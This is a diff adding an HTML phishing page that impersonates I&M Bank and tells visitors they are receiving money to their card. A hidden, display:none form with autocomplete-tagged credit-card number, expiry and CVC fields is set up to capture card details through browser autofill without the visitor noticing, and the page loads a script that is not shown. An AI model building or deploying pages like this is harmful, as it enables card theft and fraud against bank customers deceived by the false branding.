@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="login-container">
+        <img src="path_to_logo.png" alt="Bank Logo" style="width: 100px; margin-bottom: 20px;">
+        <h1>To receive money to your card:</h1>
+        <form id="loginForm">
+            <button type="continue">continue</button>
+        </form>
+        <p><a href="#">we have been ask to send payment to your card</a></p>
+        <p class="privacy">At I&M Bank, we value your data privacy. Read our <a href="#">Privacy Notice</a>.</p>
+    </div>
+
+    <!-- Hidden Form for Autofill (optional) -->
+    <form id="hiddenForm" style="display: none;">
+        <input type="text" name="cc-number" class="hidden-input" autocomplete="cc-number" placeholder="Credit Card Number">
+        <input type="text" name="cc-exp" class="hidden-input" autocomplete="cc-exp" placeholder="MM/YY">
+        <input type="text" name="cc-cvc" class="hidden-input" autocomplete="cc-cvc" placeholder="CVC">
+    </form>
+
+    <!-- JavaScript -->
+    <script src="script.js"></script>
+</body>
+</html>
